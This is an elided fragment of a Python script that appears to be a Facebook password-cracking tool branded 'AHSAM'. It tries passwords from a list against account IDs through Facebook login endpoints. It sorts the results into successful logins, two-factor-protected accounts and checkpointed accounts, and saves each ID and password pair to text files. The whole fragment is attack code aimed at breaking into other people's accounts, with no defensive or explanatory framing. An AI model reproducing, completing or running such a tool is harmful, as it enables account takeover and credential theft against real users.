    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[AHSAM-SUCCESSFULL] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                ...
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[AHSAM-2FACTOR] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[AHSAM-CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                print('\033[1;32m[AHSAM-SUCCESSFULL] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m[AHSAM-2FACTOR] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m[AHSAM-CHECKPOINT] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
...
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            ...
            if 'c_user' in cookies:
                    print('\033[1;32m[AHSAM-SUCCESSFULL] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[AHSAM-2FACTOR] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        ...
                        if cid in cp:
                            ...
                            print('\033[1;31m[AHSAM-CHECKPOINT] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
